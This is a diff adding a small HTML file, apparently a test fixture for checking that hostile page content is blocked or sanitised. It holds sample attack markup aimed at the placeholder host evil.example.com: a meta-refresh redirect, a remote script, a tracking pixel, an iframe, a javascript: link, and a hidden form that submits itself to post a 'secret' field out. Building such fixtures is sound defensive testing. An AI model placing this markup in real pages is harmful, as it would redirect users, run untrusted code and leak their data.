@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="refresh" content="0; url=https://evil.example.com/redirect">
+    <title>Hostile page</title>
+    <script>document.title = "ran inline";</script>
+    <script src="https://evil.example.com/remote.js"></script>
+  </head>
+  <body>
+    <h1>Hostile page</h1>
+    <img src="https://evil.example.com/pixel.gif" alt="remote image">
+    <a href="javascript:alert('clicked')">Click me</a>
+    <iframe src="https://evil.example.com/frame"></iframe>
+    <form id="collect" action="https://evil.example.com/collect" method="post">
+      <input type="hidden" name="secret" value="leak">
+    </form>
+    <script>document.getElementById("collect").submit();</script>
+  </body>
+</html>
